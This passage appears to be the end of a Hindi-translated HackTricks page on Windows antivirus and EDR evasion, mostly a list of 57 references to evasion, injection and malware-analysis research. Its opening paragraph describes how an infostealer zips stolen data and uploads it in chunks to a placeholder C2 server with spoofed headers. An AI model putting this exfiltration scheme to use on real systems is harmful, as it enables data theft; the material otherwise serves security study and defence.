- काम पूरा होने पर, statically linked `miniz` library से सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s तक sleep करता है और archive को HTTP POST के ज़रिए 10 MB chunks में `http://<C2>:6767/upload` पर भेजता है; इस दौरान browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) को spoof किया जाता है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` जोड़ा जाता है, और आखिरी chunk में `complete: true` जोड़ा जाता है ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [उन्नत Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ब्लॉग](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: malware को अब मुफ्त छूट नहीं](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – दस्तावेज़](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – नमूना](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – नमूना](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer के लिए नया Infection Chain और ConfuserEx-आधारित Obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell से पहले: Storm-2603 के पिछले Ransomware Operations की पड़ताल](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports का दुरुपयोग](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports की सूची (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library की search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security और access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU संदर्भ (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) के सहारे EDRs का मुकाबला](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique से Windows Defender के Protective Shell को तोड़ना](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command संदर्भ](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer आ रहा है: एक नया, महत्वाकांक्षी Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing से Node.js Malware को निष्प्रभावी करना](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace के साथ Adaptix को सुलाना](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, और Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - अपने Dotnet Etw को छिपाना](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations में Chrome Remote Desktop का दुरुपयोग: एक व्यावहारिक मार्गदर्शिका](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender के Remediation Driver को Kernel Operation Primitive के रूप में हथियार बनाना](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo का companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM का उपयोग करके Self-Masking Functions बनाना](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Redirected Input और Output के साथ Child Process बनाना](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge के साथ C# Tools को फिर से गढ़ना](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET Projects को compile करना](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept और source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection के लिए thread pool internals का दुरुपयोग](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset और thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Red team implants का मूल्यांकन करने के लिए EMBER2024 का उपयोग](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning-आधारित Detections से बचना](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-आधारित .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader का technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [tprtdll-Injection का अवलोकन और export inventory](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Trusted-twin self-injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Trusted-twin cross-process injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
